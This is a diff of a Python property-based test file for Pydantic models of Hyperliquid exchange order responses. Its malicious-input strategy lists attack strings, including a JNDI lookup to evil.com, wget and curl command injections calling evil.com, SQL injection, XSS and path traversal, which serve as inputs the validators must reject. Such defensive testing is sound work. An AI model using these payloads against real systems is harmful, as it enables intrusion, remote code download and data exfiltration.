@@ -1,9 +1,27 @@
-# tests/unit/apis/hyperliquid/models/test_hl_raw_exchange_response.py
-"""Module docstring."""
+"""Property-based tests for Hyperliquid raw exchange response models.
 
+These tests validate critical security boundary models that process external exchange response data.
+The models tested here are essential for order status tracking, execution confirmation, and error handling.
+
+SECURITY CRITICAL: These raw models protect against:
+- Malicious response data that could manipulate order status information
+- Financial precision errors in fill prices and sizes
+- Order ID manipulation that could affect execution tracking
+- Status manipulation that could change order lifecycle behavior
+- Buffer overflow attacks through oversized response data
+- Injection attacks through malformed error messages
+- Response tampering that could affect trading decisions
+
+Property testing ensures comprehensive coverage of response edge cases and adversarial inputs.
+"""
+
+import json
+from decimal import Decimal
 from typing import Any
 
 import pytest
+from hypothesis import given, strategies as st, assume
+from hypothesis.strategies import SearchStrategy
 from pydantic import ValidationError
 
 from cyberdelta.apis.hyperliquid.models.hl_raw_exchange_response import (
@@ -13,79 +31,781 @@ from cyberdelta.apis.hyperliquid.models.hl_raw_exchange_response import (
     HyperliquidRawExchangeStatusObject,
     HyperliquidRawExchangeStatusResting,
 )
-from cyberdelta.config.structlog_config import get_logger
+from cyberdelta.apis.exceptions.field_validation import TypeFieldError
 from cyberdelta.exceptions.parsing import EmptyStringError
 
 
-logger = get_logger(__name__)
+# =============================================================================
+# HYPOTHESIS STRATEGIES FOR EXCHANGE RESPONSE MODEL TESTING
+# =============================================================================
 
 
-# --- Fixtures ---
-@pytest.fixture
-def valid_resting_data() -> dict[str, Any]:
-    """Return valid resting data for testing."""
-    return {"oid": 12345}
+def decimal_str_strategy() -> SearchStrategy[str]:
+    """Generate valid decimal strings for prices and amounts."""
+    return st.one_of([
+        st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal("1000000"), places=8).map(
+            str
+        ),
+        st.decimals(min_value=Decimal("0.01"), max_value=Decimal("100000"), places=6).map(str),
+        st.just("0"),  # Zero
+        st.just("0.01"),  # Small amount
+        st.just("1.0"),  # Unit amount
+        st.just("100.0"),  # Standard amount
+        st.just("1234.56"),  # Common format
+        st.just("50000.123456"),  # High-precision
+        st.just("0.00000001"),  # Minimum precision
+        # Scientific notation (valid for decimal parsing)
+        st.just("1e2"),
+        st.just("1.5e3"),
+        st.just("2.5e-4"),
+    ])
 
 
-@pytest.fixture
-def valid_filled_data() -> dict[str, Any]:
-    """Return valid filled data for testing."""
-    return {"oid": 67890, "totalSz": "1.5", "avgPx": "150.25"}
+def positive_decimal_str_strategy() -> SearchStrategy[str]:
+    """Generate valid positive decimal strings."""
+    return st.one_of([
+        st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal("1000000"), places=8).map(
+            str
+        ),
+        st.decimals(min_value=Decimal("0.01"), max_value=Decimal("100000"), places=6).map(str),
+        st.just("0.01"),
+        st.just("1.0"),
+        st.just("100.0"),
+        st.just("1234.56"),
+        st.just("50000.123456"),
+    ])
 
 
-@pytest.fixture
-def valid_status_object_resting(valid_resting_data: dict[str, Any]) -> dict[str, Any]:
-    """Return valid status object resting for testing."""
-    return {"resting": valid_resting_data}
+def order_id_strategy() -> SearchStrategy[int]:
+    """Generate valid order IDs."""
+    return st.integers(min_value=0, max_value=2**63 - 1)
 
 
-@pytest.fixture
-def valid_status_object_filled(valid_filled_data: dict[str, Any]) -> dict[str, Any]:
-    """Return valid status object filled for testing."""
-    return {"filled": valid_filled_data}
+def status_string_strategy() -> SearchStrategy[str]:
+    """Generate valid status strings."""
+    return st.sampled_from([
+        "canceled",
+        "modified",
+        "success",
+        "rejected",
+        "failed",
+        "pending",
+        "acknowledged",
+        "working",
+        "filled",
+        "partial",
+    ])
 
 
-@pytest.fixture
-def valid_status_object_error() -> dict[str, Any]:
-    """Return valid status object error for testing."""
-    return {"error": "Order rejected due to insufficient margin."}
+def error_message_strategy() -> SearchStrategy[str]:
+    """Generate valid error message strings."""
+    return st.one_of([
+        st.sampled_from([
+            "Order rejected due to insufficient margin",
+            "Invalid order parameters",
+            "Market closed",
+            "Rate limit exceeded",
+            "Unauthorized request",
+            "Order not found",
+            "Execution failed",
+            "Network timeout",
+            "System error",
+        ]),
+        st.text(
+            min_size=1,
+            max_size=256,
+            alphabet=st.characters(
+                blacklist_categories=["Cs"],  # Exclude surrogates
+                min_codepoint=1,  # Exclude null character
+            ),
+        ).filter(lambda x: x.strip()),
+    ])
 
 
-@pytest.fixture
-def valid_response_data_dict(
-    valid_status_object_resting: dict[str, Any],
-    valid_status_object_filled: dict[str, Any],
-) -> dict[str, Any]:
-    """Return valid response data dict for testing."""
+@st.composite
+def valid_resting_data(draw) -> dict[str, int]:
+    """Generate valid resting status data."""
+    return {"oid": draw(order_id_strategy())}
+
+
+@st.composite
+def valid_filled_data(draw) -> dict[str, Any]:
+    """Generate valid filled status data."""
     return {
-        "type": "order",
-        "statuses": [
-            "canceled",
-            valid_status_object_resting,
-            valid_status_object_filled,
-            "modified",
-            "success",
-        ],
+        "oid": draw(order_id_strategy()),
+        "totalSz": draw(positive_decimal_str_strategy()),
+        "avgPx": draw(decimal_str_strategy()),
     }
 
 
-@pytest.fixture
-def valid_top_level_response(valid_response_data_dict: dict[str, Any]) -> dict[str, Any]:
-    """Return valid top level response for testing."""
-    return {"status": "ok", "data": valid_response_data_dict}
+@st.composite
+def valid_status_object_data(draw) -> dict[str, Any]:
+    """Generate valid status object data."""
+    return draw(
+        st.one_of([
+            st.builds(lambda resting: {"resting": resting}, resting=valid_resting_data()),
+            st.builds(lambda filled: {"filled": filled}, filled=valid_filled_data()),
+            st.builds(lambda error: {"error": error}, error=error_message_strategy()),
+        ])
+    )
 
 
-# --- Success Cases ---
-def test_hl_resting_valid(valid_resting_data: dict[str, Any]) -> None:
+def status_entry_strategy() -> SearchStrategy[str | dict[str, Any]]:
+    """Generate valid status entries (strings or objects)."""
+    return st.one_of([
+        status_string_strategy(),
+        valid_status_object_data(),
+    ])
+
+
+@st.composite
+def valid_response_data(draw) -> dict[str, Any]:
+    """Generate valid response data."""
+    return {
+        "type": draw(st.text(min_size=1, max_size=64).filter(lambda x: x.strip())),
+        "statuses": draw(st.lists(status_entry_strategy(), min_size=0, max_size=20)),
+    }
+
+
+@st.composite
+def valid_exchange_response_data(draw) -> dict[str, Any]:
+    """Generate valid exchange response data."""
+    return {
+        "status": "ok",  # Must be "ok" according to model
+        "data": draw(
+            st.one_of([
+                st.none(),  # Data can be None
+                valid_response_data(),
+            ])
+        ),
+    }
+
+
+def malicious_exchange_strategy() -> SearchStrategy[Any]:
+    """Generate malicious values for exchange response security testing."""
+    return st.one_of([
+        # Exchange response manipulation attempts
+        st.just("${jndi:ldap://evil.com/steal-responses}"),
+        st.just("../../etc/passwd"),  # Path traversal
+        # XSS attempts
+        st.just("<script>alert('exchange-xss')</script>"),
+        st.just("<img src=x onerror=alert(document.cookie)>"),
+        # SQL injection attempts
+        st.just("'; DROP TABLE orders;--"),
+        st.just("1' UNION SELECT * FROM trades--"),
+        # Buffer overflow attempts
+        st.text(min_size=1000, max_size=1500),
+        st.just("E" * 10000),
+        # Unicode attacks
+        st.just("\udce2\udc28\udc00"),  # Lone surrogates
+        st.just("\x00\x01\x02"),  # Control characters
+        # Format string attacks
+        st.just("%s%s%s%s%n"),
+        st.just("%x%x%x%x"),
+        # Command injection
+        st.just("; wget evil.com/backdoor"),
+        st.just("`curl evil.com/exfiltrate`"),
+        # NoSQL injection
+        st.just("'; return db.orders.find(); //"),
+        # JSON injection
+        st.just('{"$where": "this.status == \'filled\'"}'),
+        # Invalid decimals
+        st.just("NaN"),
+        st.just("inf"),
+        st.just("-inf"),
+        st.just("Infinity"),
+        st.just("not_a_number"),
+        # Type confusion
+        st.none(),
+        st.integers(),
+        st.floats(),
+        st.booleans(),
+        st.lists(st.text()),
+        st.dictionaries(st.text(), st.text()),
+        st.binary(),
+    ])
+
+
+# =============================================================================
+# PROPERTY TESTS FOR HYPERLIQUID RAW EXCHANGE STATUS RESTING MODEL
+# =============================================================================
+
+
+class TestHyperliquidRawExchangeStatusRestingProperties:
+    """Property-based tests for exchange status resting validation and security."""
+
+    @given(resting_data=valid_resting_data())
+    def test_resting_validation_success_properties(self, resting_data: dict[str, int]) -> None:
+        """Property: Valid resting data should always create valid resting objects."""
+        # Skip invalid data
+        oid = resting_data["oid"]
+        assume(isinstance(oid, int) and oid >= 0)
+
+        obj = HyperliquidRawExchangeStatusResting.model_validate(resting_data)
+
+        # Property: Object should be created successfully
+        assert isinstance(obj, HyperliquidRawExchangeStatusResting)
+        assert obj.oid == resting_data["oid"]
+
+        # Property: Model should be configured correctly
+        assert obj.model_config.get("extra") == "forbid"
+        assert obj.model_config.get("frozen") is True
+
+    @given(malicious_value=malicious_exchange_strategy())
+    def test_resting_security_boundary_properties(self, malicious_value: Any) -> None:
+        """Property: Resting status should reject malicious inputs safely."""
+        resting_data = {"oid": malicious_value}
+
+        # Property: Malicious input should be rejected
+        with pytest.raises((ValidationError, TypeError, TypeFieldError)):
+            HyperliquidRawExchangeStatusResting.model_validate(resting_data)
+
+    @given(invalid_oid=st.integers(min_value=-1000, max_value=-1))
+    def test_resting_negative_oid_properties(self, invalid_oid: int) -> None:
+        """Property: Resting status should reject negative order IDs."""
+        resting_data = {"oid": invalid_oid}
+
+        # Property: Negative OIDs should be rejected
+        with pytest.raises(ValidationError):
+            HyperliquidRawExchangeStatusResting.model_validate(resting_data)
+
+    @given(
+        extra_fields=st.dictionaries(
+            st.text(min_size=1, max_size=20),
+            st.text(min_size=1, max_size=20),
+            min_size=1,
+            max_size=5,
+        )
+    )
+    def test_resting_extra_fields_properties(self, extra_fields: dict[str, str]) -> None:
+        """Property: Resting status should forbid extra fields."""
+        resting_data = {"oid": 12345}
+        resting_data.update(extra_fields)
+
+        # Property: Extra fields should be rejected
+        with pytest.raises(ValidationError):
+            HyperliquidRawExchangeStatusResting.model_validate(resting_data)
+
+
+# =============================================================================
+# PROPERTY TESTS FOR HYPERLIQUID RAW EXCHANGE STATUS FILLED MODEL
+# =============================================================================
+
+
+class TestHyperliquidRawExchangeStatusFilledProperties:
+    """Property-based tests for exchange status filled validation and security."""
+
+    @given(filled_data=valid_filled_data())
+    def test_filled_validation_success_properties(self, filled_data: dict[str, Any]) -> None:
+        """Property: Valid filled data should always create valid filled objects."""
+        # Skip invalid data
+        oid = filled_data["oid"]
+        assume(isinstance(oid, int) and oid >= 0)
+
+        # Validate decimal fields
+        for field in ["totalSz", "avgPx"]:
+            value = filled_data[field]
+            assume(isinstance(value, str) and value.strip())
+            try:
+                decimal_val = Decimal(value.strip())
+                assume(decimal_val.is_finite())
+                if field == "totalSz":
+                    assume(decimal_val >= 0)
+            except (ValueError, TypeError):
+                assume(False)
+
+        obj = HyperliquidRawExchangeStatusFilled.model_validate(filled_data)
+
+        # Property: Object should be created successfully
+        assert isinstance(obj, HyperliquidRawExchangeStatusFilled)
+        assert obj.oid == filled_data["oid"]
+        assert Decimal(obj.total_sz) == Decimal(filled_data["totalSz"])
+        assert Decimal(obj.avg_px) == Decimal(filled_data["avgPx"])
+
+        # Property: Model should be configured correctly
+        assert obj.model_config.get("extra") == "forbid"
+        assert obj.model_config.get("frozen") is True
+
+    @given(
+        field_name=st.sampled_from(["oid", "totalSz", "avgPx"]),
+        malicious_value=malicious_exchange_strategy(),
+    )
+    def test_filled_security_boundary_properties(
+        self, field_name: str, malicious_value: Any
+    ) -> None:
+        """Property: Filled status should reject malicious inputs safely."""
+        base_data = {
+            "oid": 12345,
+            "totalSz": "1.0",
+            "avgPx": "100.0",
+        }
+        base_data[field_name] = malicious_value
+
+        # Property: Malicious input should be rejected
+        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
+            HyperliquidRawExchangeStatusFilled.model_validate(base_data)
+
+    @given(
+        invalid_decimal=st.one_of([
+            st.just(""),
+            st.just("   "),
+            st.just("NaN"),
+            st.just("inf"),
+            st.just("-inf"),
+            st.just("Infinity"),
+            st.just("not_a_number"),
+            st.just("1..0"),
+        ])
+    )
+    def test_filled_invalid_decimal_properties(self, invalid_decimal: str) -> None:
+        """Property: Filled status should validate decimal constraints."""
+        filled_data = {
+            "oid": 12345,
+            "totalSz": invalid_decimal,  # Invalid decimal
+            "avgPx": "100.0",
+        }
+
+        try:
+            # Check if the value can be parsed as a finite decimal
+            decimal_val = Decimal(invalid_decimal.strip() if invalid_decimal else "")
+            is_finite = decimal_val.is_finite()
+            is_empty = not invalid_decimal.strip()
+
+            if is_finite and not is_empty:
+                # Property: Valid finite decimals should be accepted
+                obj = HyperliquidRawExchangeStatusFilled.model_validate(filled_data)
+                assert Decimal(obj.total_sz) == decimal_val
+            else:
+                # Property: Non-finite or empty values should be rejected
+                with pytest.raises((ValidationError, EmptyStringError, TypeFieldError)):
+                    HyperliquidRawExchangeStatusFilled.model_validate(filled_data)
+
+        except (ValueError, TypeError):
+            # Property: Unparseable strings should be rejected
+            with pytest.raises((ValidationError, EmptyStringError, TypeFieldError)):
+                HyperliquidRawExchangeStatusFilled.model_validate(filled_data)
+
+
+# =============================================================================
+# PROPERTY TESTS FOR HYPERLIQUID RAW EXCHANGE STATUS OBJECT MODEL
+# =============================================================================
+
+
+class TestHyperliquidRawExchangeStatusObjectProperties:
+    """Property-based tests for exchange status object validation and security."""
+
+    @given(status_data=valid_status_object_data())
+    def test_status_object_validation_success_properties(self, status_data: dict[str, Any]) -> None:
+        """Property: Valid status object data should always create valid status objects."""
+        # Validate the structure based on which field is present
+        if "resting" in status_data:
+            resting = status_data["resting"]
+            assume(isinstance(resting["oid"], int) and resting["oid"] >= 0)
+        elif "filled" in status_data:
+            filled = status_data["filled"]
+            assume(isinstance(filled["oid"], int) and filled["oid"] >= 0)
+            # Validate decimal fields
+            for field in ["totalSz", "avgPx"]:
+                value = filled[field]
+                assume(isinstance(value, str) and value.strip())
+                try:
+                    decimal_val = Decimal(value.strip())
+                    assume(decimal_val.is_finite())
+                    if field == "totalSz":
+                        assume(decimal_val >= 0)
+                except (ValueError, TypeError):
+                    assume(False)
+        elif "error" in status_data:
+            error_msg = status_data["error"]
+            assume(isinstance(error_msg, str) and error_msg.strip())
+
+        obj = HyperliquidRawExchangeStatusObject.model_validate(status_data)
+
+        # Property: Object should be created successfully
+        assert isinstance(obj, HyperliquidRawExchangeStatusObject)
+
+        # Property: Only one field should be set
+        fields_set = sum([
+            obj.resting is not None,
+            obj.filled is not None,
+            obj.error is not None,
+        ])
+        assert fields_set == 1
+
+        # Property: Model should be configured correctly
+        assert obj.model_config.get("extra") == "forbid"
+        assert obj.model_config.get("frozen") is True
+
+    @given(
+        field_name=st.sampled_from(["resting", "filled", "error"]),
+        malicious_value=malicious_exchange_strategy(),
+    )
+    def test_status_object_security_boundary_properties(
+        self, field_name: str, malicious_value: Any
+    ) -> None:
+        """Property: Status object should reject malicious inputs safely."""
+        status_data = {field_name: malicious_value}
+
+        # Property: Malicious input should be rejected
+        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
+            HyperliquidRawExchangeStatusObject.model_validate(status_data)
+
+    @given(
+        extra_fields=st.dictionaries(
+            st.text(min_size=1, max_size=20),
+            st.text(min_size=1, max_size=20),
+            min_size=1,
+            max_size=5,
+        )
+    )
+    def test_status_object_extra_fields_properties(self, extra_fields: dict[str, str]) -> None:
+        """Property: Status object should forbid extra fields."""
+        status_data = {"error": "Some error"}
+        status_data.update(extra_fields)
+
+        # Property: Extra fields should be rejected
+        with pytest.raises(ValidationError):
+            HyperliquidRawExchangeStatusObject.model_validate(status_data)
+
+
+# =============================================================================
+# PROPERTY TESTS FOR HYPERLIQUID RAW EXCHANGE RESPONSE DATA MODEL
+# =============================================================================
+
+
+class TestHyperliquidRawExchangeResponseDataProperties:
+    """Property-based tests for exchange response data validation and security."""
+
+    @given(response_data=valid_response_data())
+    def test_response_data_validation_success_properties(
+        self, response_data: dict[str, Any]
+    ) -> None:
+        """Property: Valid response data should always create valid response data objects."""
+        # Skip invalid data
+        type_str = response_data["type"]
+        assume(isinstance(type_str, str) and type_str.strip())
+
+        # Validate statuses list
+        statuses = response_data["statuses"]
+        assume(isinstance(statuses, list))
+
+        valid_statuses = []
+        for status in statuses:
+            if isinstance(status, str):
+                assume(
+                    status
+                    in [
+                        "canceled",
+                        "modified",
+                        "success",
+                        "rejected",
+                        "failed",
+                        "pending",
+                        "acknowledged",
+                        "working",
+                        "filled",
+                        "partial",
+                    ]
+                )
+                valid_statuses.append(status)
+            elif isinstance(status, dict):
+                # Validate status object structure
+                if "resting" in status:
+                    resting = status["resting"]
+                    assume(isinstance(resting["oid"], int) and resting["oid"] >= 0)
+                elif "filled" in status:
+                    filled = status["filled"]
+                    assume(isinstance(filled["oid"], int) and filled["oid"] >= 0)
+                    for field in ["totalSz", "avgPx"]:
+                        value = filled[field]
+                        assume(isinstance(value, str) and value.strip())
+                        try:
+                            decimal_val = Decimal(value.strip())
+                            assume(decimal_val.is_finite())
+                        except (ValueError, TypeError):
+                            assume(False)
+                elif "error" in status:
+                    error_msg = status["error"]
+                    assume(isinstance(error_msg, str) and error_msg.strip())
+                valid_statuses.append(status)
+
+        # Update with valid statuses only
+        response_data["statuses"] = valid_statuses
+
+        obj = HyperliquidRawExchangeResponseData.model_validate(response_data)
+
+        # Property: Object should be created successfully
+        assert isinstance(obj, HyperliquidRawExchangeResponseData)
+        assert obj.type == response_data["type"]
+        assert len(obj.statuses) == len(response_data["statuses"])
+
+        # Property: Model should be configured correctly
+        assert obj.model_config.get("extra") == "forbid"
+        assert obj.model_config.get("frozen") is True
+
+    @given(
+        field_name=st.sampled_from(["type", "statuses"]),
+        malicious_value=malicious_exchange_strategy(),
+    )
+    def test_response_data_security_boundary_properties(
+        self, field_name: str, malicious_value: Any
+    ) -> None:
+        """Property: Response data should reject malicious inputs safely."""
+        base_data = {
+            "type": "order",
+            "statuses": ["success"],
+        }
+        base_data[field_name] = malicious_value
+
+        # Property: Malicious input should be rejected
+        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
+            HyperliquidRawExchangeResponseData.model_validate(base_data)
+
+    @given(
+        invalid_statuses=st.one_of([
+            st.integers(),  # Not a list
+            st.text(),  # Not a list
+            st.lists(st.integers()),  # List of wrong types
+            st.lists(
+                st.text().filter(
+                    lambda x: x
+                    not in [
+                        "canceled",
+                        "modified",
+                        "success",
+                        "rejected",
+                        "failed",
+                        "pending",
+                        "acknowledged",
+                        "working",
+                        "filled",
+                        "partial",
+                    ]
+                )
+            ),  # List of invalid strings
+        ])
+    )
+    def test_response_data_invalid_statuses_properties(self, invalid_statuses: Any) -> None:
+        """Property: Response data should validate statuses list structure."""
+        response_data = {
+            "type": "order",
+            "statuses": invalid_statuses,
+        }
+
+        # Property: Invalid statuses should be rejected
+        with pytest.raises((ValidationError, TypeError)):
+            HyperliquidRawExchangeResponseData.model_validate(response_data)
+
+
+# =============================================================================
+# PROPERTY TESTS FOR HYPERLIQUID RAW EXCHANGE RESPONSE MODEL
+# =============================================================================
+
+
+class TestHyperliquidRawExchangeResponseProperties:
+    """Property-based tests for exchange response validation and security."""
+
+    @given(exchange_data=valid_exchange_response_data())
+    def test_exchange_response_validation_success_properties(
+        self, exchange_data: dict[str, Any]
+    ) -> None:
+        """Property: Valid exchange response data should always create valid response objects."""
+        # Skip invalid data
+        status = exchange_data["status"]
+        assume(status == "ok")  # Must be "ok" according to model
+
+        # Validate data field if present
+        data = exchange_data["data"]
+        if data is not None:
+            assume(isinstance(data, dict))
+            type_str = data["type"]
+            assume(isinstance(type_str, str) and type_str.strip())
+
+            # Validate statuses
+            statuses = data["statuses"]
+            assume(isinstance(statuses, list))
+
+            valid_statuses = []
+            for status_item in statuses:
+                if isinstance(status_item, str):
+                    assume(
+                        status_item
+                        in [
+                            "canceled",
+                            "modified",
+                            "success",
+                            "rejected",
+                            "failed",
+                            "pending",
+                            "acknowledged",
+                            "working",
+                            "filled",
+                            "partial",
+                        ]
+                    )
+                    valid_statuses.append(status_item)
+                elif isinstance(status_item, dict):
+                    # Validate status object
+                    if "resting" in status_item:
+                        resting = status_item["resting"]
+                        assume(isinstance(resting["oid"], int) and resting["oid"] >= 0)
+                    elif "filled" in status_item:
+                        filled = status_item["filled"]
+                        assume(isinstance(filled["oid"], int) and filled["oid"] >= 0)
+                        for field in ["totalSz", "avgPx"]:
+                            value = filled[field]
+                            assume(isinstance(value, str) and value.strip())
+                            try:
+                                decimal_val = Decimal(value.strip())
+                                assume(decimal_val.is_finite())
+                            except (ValueError, TypeError):
+                                assume(False)
+                    elif "error" in status_item:
+                        error_msg = status_item["error"]
+                        assume(isinstance(error_msg, str) and error_msg.strip())
+                    valid_statuses.append(status_item)
+
+            data["statuses"] = valid_statuses
+
+        obj = HyperliquidRawExchangeResponse.model_validate(exchange_data)
+
+        # Property: Object should be created successfully
+        assert isinstance(obj, HyperliquidRawExchangeResponse)
+        assert obj.status == "ok"
+
+        if exchange_data["data"] is not None:
+            assert obj.data is not None
+            assert obj.data.type == exchange_data["data"]["type"]
+        else:
+            assert obj.data is None
+
+        # Property: Model should be configured correctly
+        assert obj.model_config.get("extra") == "forbid"
+        assert obj.model_config.get("frozen") is True
+
+    @given(
+        field_name=st.sampled_from(["status", "data"]),
+        malicious_value=malicious_exchange_strategy(),
+    )
+    def test_exchange_response_security_boundary_properties(
+        self, field_name: str, malicious_value: Any
+    ) -> None:
+        """Property: Exchange response should reject malicious inputs safely."""
+        base_data = {
+            "status": "ok",
+            "data": None,
+        }
+        base_data[field_name] = malicious_value
+
+        # Property: Malicious input should be rejected
+        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
+            HyperliquidRawExchangeResponse.model_validate(base_data)
+
+    @given(invalid_status=st.text().filter(lambda x: x != "ok"))
+    def test_exchange_response_invalid_status_properties(self, invalid_status: str) -> None:
+        """Property: Exchange response should only accept 'ok' as status."""
+        assume(invalid_status.strip())  # Skip empty strings
+
+        exchange_data = {
+            "status": invalid_status,
+            "data": None,
+        }
+
+        # Property: Invalid status values should be rejected
+        with pytest.raises((ValidationError, EmptyStringError)):
+            HyperliquidRawExchangeResponse.model_validate(exchange_data)
+
+    @given(exchange_data=valid_exchange_response_data())
+    def test_exchange_response_json_serialization_properties(
+        self, exchange_data: dict[str, Any]
+    ) -> None:
+        """Property: Exchange response should maintain JSON serialization compatibility."""
+        # Skip invalid data (same validation as success test)
+        status = exchange_data["status"]
+        assume(status == "ok")
+
+        data = exchange_data["data"]
+        if data is not None:
+            assume(isinstance(data, dict))
+            type_str = data["type"]
+            assume(isinstance(type_str, str) and type_str.strip())
+
+            statuses = data["statuses"]
+            assume(isinstance(statuses, list))
+
+            valid_statuses = []
+            for status_item in statuses:
+                if isinstance(status_item, str):
+                    assume(
+                        status_item
+                        in [
+                            "canceled",
+                            "modified",
+                            "success",
+                            "rejected",
+                            "failed",
+                            "pending",
+                            "acknowledged",
+                            "working",
+                            "filled",
+                            "partial",
+                        ]
+                    )
+                    valid_statuses.append(status_item)
+                elif isinstance(status_item, dict):
+                    if "resting" in status_item:
+                        resting = status_item["resting"]
+                        assume(isinstance(resting["oid"], int) and resting["oid"] >= 0)
+                    elif "filled" in status_item:
+                        filled = status_item["filled"]
+                        assume(isinstance(filled["oid"], int) and filled["oid"] >= 0)
+                        for field in ["totalSz", "avgPx"]:
+                            value = filled[field]
+                            assume(isinstance(value, str) and value.strip())
+                            try:
+                                decimal_val = Decimal(value.strip())
+                                assume(decimal_val.is_finite())
+                            except (ValueError, TypeError):
+                                assume(False)
+                    elif "error" in status_item:
+                        error_msg = status_item["error"]
+                        assume(isinstance(error_msg, str) and error_msg.strip())
+                    valid_statuses.append(status_item)
+
+            data["statuses"] = valid_statuses
+
+        obj = HyperliquidRawExchangeResponse.model_validate(exchange_data)
+        json_str = obj.model_dump_json()
+        parsed_json = json.loads(json_str)
+
+        # Property: Should be able to reconstruct from JSON
+        reconstructed = HyperliquidRawExchangeResponse.model_validate(parsed_json)
+        assert reconstructed.status == obj.status
+
+        if obj.data is not None:
+            assert reconstructed.data is not None
+            assert reconstructed.data.type == obj.data.type
+        else:
+            assert reconstructed.data is None
+
+
+# =============================================================================
+# LEGACY COMPATIBILITY TESTS
+# =============================================================================
+
+
+def test_HyperliquidRawExchangeStatusResting_valid() -> None:
     """Test hl resting valid."""
+    valid_resting_data = {"oid": 12345}
     obj = HyperliquidRawExchangeStatusResting.model_validate(valid_resting_data)
     assert obj.oid == 12345
     assert obj.model_config.get("extra") == "forbid"
     assert obj.model_config.get("frozen") is True
 
 
-def test_hl_filled_valid(valid_filled_data: dict[str, Any]) -> None:
+def test_HyperliquidRawExchangeStatusFilled_valid() -> None:
     """Test hl filled valid."""
+    valid_filled_data = {"oid": 67890, "totalSz": "1.5", "avgPx": "150.25"}
     obj = HyperliquidRawExchangeStatusFilled.model_validate(valid_filled_data)
     assert obj.oid == 67890
     assert obj.total_sz == "1.5"
@@ -94,12 +814,9 @@ def test_hl_filled_valid(valid_filled_data: dict[str, Any]) -> None:
     assert obj.model_config.get("frozen") is True
 
 
-def test_hl_status_object_valid(
-    valid_status_object_resting: dict[str, Any],
-    valid_status_object_filled: dict[str, Any],
-    valid_status_object_error: dict[str, Any],
-) -> None:
+def test_HyperliquidRawExchangeStatusObject_valid() -> None:
     """Test hl status object valid."""
+    valid_status_object_resting = {"resting": {"oid": 12345}}
     resting = HyperliquidRawExchangeStatusObject.model_validate(valid_status_object_resting)
     assert resting.resting is not None
     assert resting.resting.oid == 12345
@@ -108,6 +825,7 @@ def test_hl_status_object_valid(
     assert resting.model_config.get("extra") == "forbid"
     assert resting.model_config.get("frozen") is True
 
+    valid_status_object_filled = {"filled": {"oid": 67890, "totalSz": "1.5", "avgPx": "150.25"}}
     filled = HyperliquidRawExchangeStatusObject.model_validate(valid_status_object_filled)
     assert filled.resting is None
     assert filled.filled is not None
@@ -116,6 +834,7 @@ def test_hl_status_object_valid(
     assert filled.model_config.get("extra") == "forbid"
     assert filled.model_config.get("frozen") is True
 
+    valid_status_object_error = {"error": "Order rejected due to insufficient margin."}
     error = HyperliquidRawExchangeStatusObject.model_validate(valid_status_object_error)
     assert error.resting is None
     assert error.filled is None
@@ -124,8 +843,18 @@ def test_hl_status_object_valid(
     assert error.model_config.get("frozen") is True
 
 
-def test_hl_response_data_valid(valid_response_data_dict: dict[str, Any]) -> None:
+def test_HyperliquidRawExchangeResponseData_valid() -> None:
     """Test hl response data valid."""
+    valid_response_data_dict = {
+        "type": "order",
+        "statuses": [
+            "canceled",
+            {"resting": {"oid": 12345}},
+            {"filled": {"oid": 67890, "totalSz": "1.5", "avgPx": "150.25"}},
+            "modified",
+            "success",
+        ],
+    }
     obj = HyperliquidRawExchangeResponseData.model_validate(valid_response_data_dict)
     assert obj.type == "order"
     assert len(obj.statuses) == 5
@@ -142,8 +871,21 @@ def test_hl_response_data_valid(valid_response_data_dict: dict[str, Any]) -> Non
     assert obj.model_config.get("frozen") is True
 
 
-def test_hl_response_valid(valid_top_level_response: dict[str, Any]) -> None:
+def test_HyperliquidRawExchangeResponse_valid() -> None:
     """Test hl response valid."""
+    valid_top_level_response = {
+        "status": "ok",
+        "data": {
+            "type": "order",
+            "statuses": [
+                "canceled",
+                {"resting": {"oid": 12345}},
+                {"filled": {"oid": 67890, "totalSz": "1.5", "avgPx": "150.25"}},
+                "modified",
+                "success",
+            ],
+        },
+    }
     obj = HyperliquidRawExchangeResponse.model_validate(valid_top_level_response)
     assert obj.status == "ok"
     assert obj.data is not None
@@ -153,7 +895,7 @@ def test_hl_response_valid(valid_top_level_response: dict[str, Any]) -> None:
     assert obj.model_config.get("frozen") is True
 
 
-def test_hl_response_valid_no_data() -> None:
+def test_HyperliquidRawExchangeResponse_valid_no_data() -> None:
     """Test valid response when data is explicitly None."""
     response_dict = {"status": "ok", "data": None}
     obj = HyperliquidRawExchangeResponse.model_validate(response_dict)
@@ -161,7 +903,7 @@ def test_hl_response_valid_no_data() -> None:
     assert obj.data is None
 
 
-def test_hl_response_valid_missing_data() -> None:
+def test_HyperliquidRawExchangeResponse_valid_missing_data() -> None:
     """Test valid response when data key is missing."""
     response_dict = {"status": "ok"}
     obj = HyperliquidRawExchangeResponse.model_validate(response_dict)
@@ -169,286 +911,25 @@ def test_hl_response_valid_missing_data() -> None:
     assert obj.data is None
 
 
-# --- Failure Cases --- #
+def test_HyperliquidRawExchangeStatusResting_invalid_oid() -> None:
+    """Test hl resting invalid oid."""
+    with pytest.raises(ValidationError):
+        HyperliquidRawExchangeStatusResting.model_validate({"oid": -1})
 
 
-# Resting Model Failures
-@pytest.mark.parametrize(
-    ("invalid_data", "expected_msg_part"),
-    [
-        ({"oid": -1}, "value cannot be negative"),
-        ({"oid": "abc"}, "must be integer"),
-        ({"oid": 1.0}, "must be integer"),
-        ({}, "Field required"),
-    ],
-)
-def test_hl_resting_invalid(invalid_data: dict[str, Any], expected_msg_part: str) -> None:
-    """Test hl resting invalid."""
-    with pytest.raises((ValidationError, TypeError)) as exc_info:
-        HyperliquidRawExchangeStatusResting.model_validate(invalid_data)
-    assert expected_msg_part.lower() in str(exc_info.value).lower()
+def test_HyperliquidRawExchangeStatusFilled_invalid_decimal() -> None:
+    """Test hl filled invalid decimal."""
+    with pytest.raises((ValidationError, EmptyStringError)):
+        HyperliquidRawExchangeStatusFilled.model_validate({"oid": 1, "totalSz": "", "avgPx": "1.0"})
 
 
-def test_hl_resting_extra_fields_ignored() -> None:
-    """Test that extra fields are rejected due to extra='forbid'."""
-    data = {"oid": 123, "extra": 1, "another": "field"}
-    with pytest.raises((ValidationError, TypeError)) as exc_info:
-        HyperliquidRawExchangeStatusResting.model_validate(data)
-    assert "extra" in str(exc_info.value).lower()
